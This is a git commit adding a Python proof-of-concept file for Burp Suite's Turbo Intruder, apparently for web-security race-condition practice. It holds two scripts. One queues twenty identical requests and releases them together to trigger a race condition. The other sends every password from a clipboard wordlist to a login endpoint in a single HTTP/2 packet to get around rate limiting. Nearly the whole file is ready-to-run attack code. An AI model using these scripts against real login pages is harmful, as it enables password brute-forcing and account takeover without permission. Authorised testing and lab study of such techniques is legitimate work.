cdb64d38ed25813ce520d10457c76de34c65a451
Saitleop <107805221+Saitle@users.noreply.github.com>
2023-11-04 21:10:14 +0530

    Create POC.py

---
+++ Race Condition/POC.py
@@ -0,0 +1,42 @@
+#POC for testing with Burp Intruder
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                            concurrentConnections=1,
+                            engine=Engine.BURP2
+                            )
+    
+    # queue 20 requests in gate '1'
+    for i in range(20):
+        engine.queue(target.req, gate='1')
+    
+    # send all requests in gate '1' in parallel
+    engine.openGate('1')
+        
+
+#POC for bypassing rate limit
+def queueRequests(target, wordlists):
+
+    # as the target supports HTTP/2, use engine=Engine.BURP2 and concurrentConnections=1 for a single-packet attack
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=1,
+                           engine=Engine.BURP2
+                           )
+    
+    # assign the list of candidate passwords from your clipboard
+    passwords = wordlists.clipboard
+    
+    # queue a login request using each password from the wordlist
+    # the 'gate' argument withholds the final part of each request until engine.openGate() is invoked
+    for password in passwords:
+        engine.queue(target.req, password, gate='1')
+    
+    # once every request has been queued
+    # invoke engine.openGate() to send all requests in the given gate simultaneously
+    engine.openGate('1')
+
+
+def handleResponse(req, interesting):
+    table.add(req)
+
+
+
